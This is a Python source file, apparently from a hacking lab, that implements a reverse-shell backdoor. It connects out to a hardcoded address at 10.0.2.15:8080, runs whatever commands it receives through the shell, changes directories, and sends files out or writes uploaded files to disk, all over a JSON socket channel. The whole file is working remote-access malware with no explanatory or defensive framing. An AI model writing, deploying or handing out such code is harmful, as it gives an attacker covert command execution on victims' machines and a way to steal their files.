import socket
import subprocess
import simplejson
import os
import base64

class SocketConnector:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def commandExecution(self, command):
        return subprocess.check_output(command, shell=True)

    def jsonSend(self, data):
        jsonData = simplejson.dumps(data)
        self.connection.send(jsonData.encode("utf-8"))

    def jsonReceive(self):
        jsonData = ""
        while True:
            try:       
                jsonData = jsonData + self.connection.recv(1024).decode()
                return simplejson.loads(jsonData)
            except ValueError:
                continue

    def executeCdCommand(self, directory):
        os.chdir(directory)
        return "cd to " + directory

    def getFileContents(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def saveFile(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "Upload OK"

    def startSocket(self):
        while True:
            command = self.jsonReceive()
            try:
                if command[0].lower() == "quit":
                    self.connection.close()
                    exit()
                elif (command[0] == "cd") and (len(command) > 1):
                    commandOutput = self.executeCdCommand(command[1])
                elif command[0] == "download":
                    commandOutput = self.getFileContents(command[1])
                elif command[0] == "upload":
                    commandOutput = self.saveFile(command[1], command[2])
                else:
                    commandOutput = self.commandExecution(command)
            except Exception:
                commandOutput = "Error!"
            self.jsonSend(commandOutput)

        self.connection.close()

socketConnectorObj = SocketConnector("10.0.2.15", 8080)
socketConnectorObj.startSocket()
        
